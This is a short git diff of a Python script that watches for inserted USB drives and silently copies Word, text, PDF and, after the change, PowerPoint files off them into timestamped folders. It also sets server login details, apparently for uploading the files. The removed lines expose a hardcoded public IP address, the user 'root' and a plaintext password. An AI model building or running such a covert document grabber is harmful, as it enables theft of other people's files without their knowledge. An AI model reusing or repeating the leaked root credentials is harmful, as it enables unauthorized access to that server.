@@ -40,7 +40,7 @@ def getremovabledisk():
 
 
 def copyfile(drives):
-    target_dir = 'D:/autobak/'
+    target_dir = ''  # Your target dir
     if not os.path.exists(target_dir):
         os.makedirs(target_dir)
     today = target_dir + time.strftime('%Y%m%d%H%M') + '/'
@@ -50,14 +50,14 @@ def copyfile(drives):
         for root, dirs, files in os.walk(udisk):
             for one in files:
                 type = os.path.splitext(one)[1]
-                if type == ".doc" or type == ".docx" or type == ".txt" or type == ".pdf":
+                if type == ".doc" or type == ".docx" or type == ".txt" or type == ".pdf" or type == ".pptx" or type == ".ppt":
                     if len(root) > 3 and not os.path.exists(today + root[3:]):
                         os.makedirs(today + root[3:])
                     shutil.copy(root + '/' + one, today + root[3:] + '/' + one)
 if __name__ == '__main__':
-    host = "114.215.142.52"
-    user = "root"
-    pwd = "Cm19960330!"
+    host = ""  #Your server IP
+    user = "" # Your ssh user/name
+    pwd = "" #Your password
     drives_bk = []
     while 1:
         time.sleep(20)
